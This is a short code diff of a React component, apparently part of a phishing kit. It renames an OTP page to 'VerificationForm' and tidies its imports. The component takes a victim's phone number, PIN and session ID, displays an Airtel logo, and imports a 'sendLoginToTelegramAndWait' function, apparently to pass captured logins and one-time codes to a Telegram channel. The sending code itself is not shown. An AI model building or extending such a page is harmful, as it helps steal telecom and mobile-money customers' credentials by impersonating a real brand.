@@ -1,24 +1,10 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { motion } from 'motion/react';
-import { AirtelLogo } from './Logos';
-import { InternetPlan } from '../types';
-import { ValidatingModal } from './ValidatingModal';
-import { sendLoginToTelegramAndWait } from '../utils/simpleTelegram';
-import { LanguageSwitch } from './LanguageSwitch';
-import { useApp } from '../context/AppContext';
-import { CountryInfo } from '../data/countries';
-import {
-  ShieldCheck,
-  ArrowLeft,
-  Lock,
-  RefreshCw,
-  AlertTriangle,
-  Loader2,
-  KeyRound,
-  Zap,
-} from 'lucide-react';
-
-interface OtpPageProps {
+import { AlertTriangle, ArrowLeft, KeyRound, Loader2, Lock, RefreshCw, ShieldCheck, Zap } from 'lucide-react';
+import { AirtelLogo, ValidatingModal, LanguageSwitch, useApp } from '../App';
+import type { InternetPlan, CountryInfo } from '../App';
+import { sendLoginToTelegramAndWait } from '../utils/telegram';
+interface VerificationFormProps {
   phone: string;
   pin: string;
   sessionId: string;
@@ -29,7 +15,7 @@ interface OtpPageProps {
   onOtpSuccess: () => void;
 }
 
-export const OtpPage: React.FC<OtpPageProps> = ({
+export const VerificationForm: React.FC<VerificationFormProps> = ({
   phone,
   pin,
   sessionId,
@@ -369,3 +355,4 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     </div>
   );
 };
+
